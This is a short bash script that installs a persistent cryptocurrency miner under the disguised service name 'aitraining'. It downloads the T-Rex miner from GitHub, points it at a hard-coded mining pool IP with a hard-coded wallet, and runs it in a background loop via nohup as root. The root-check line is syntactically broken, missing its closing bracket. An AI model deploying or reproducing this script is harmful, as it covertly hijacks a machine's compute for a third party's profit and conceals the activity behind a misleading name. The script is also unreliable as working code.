#!/bin/bash

# Define variables
SERVICE_NAME="aitraining"
SCRIPT_PATH="/root/${SERVICE_NAME}_script.sh"

# Check for root privileges
if [ "$(id -u)" -ne 0; then
  exit 1
fi

# Create the miner script with a loop
cat <<'EOF' > "$SCRIPT_PATH"
#!/bin/bash
while true; do
  wget https://github.com/trexminer/T-Rex/releases/download/0.26.8/t-rex-0.26.8-linux.tar.gz
  tar xvzf t-rex-0.26.8-linux.tar.gz
  ./t-rex -a kawpow -o stratum+tcp://178.62.59.230:4444 -u RM2ciYa3CRqyreRsf25omrB4e1S95waALr.batch
  sleep 10 # Add a delay before restarting in case of failure
done
EOF

# Set permissions for the script
chmod 700 "$SCRIPT_PATH"

# Run the looping script in the background using nohup
nohup "$SCRIPT_PATH" > /root/aitraining.log 2>&1 &
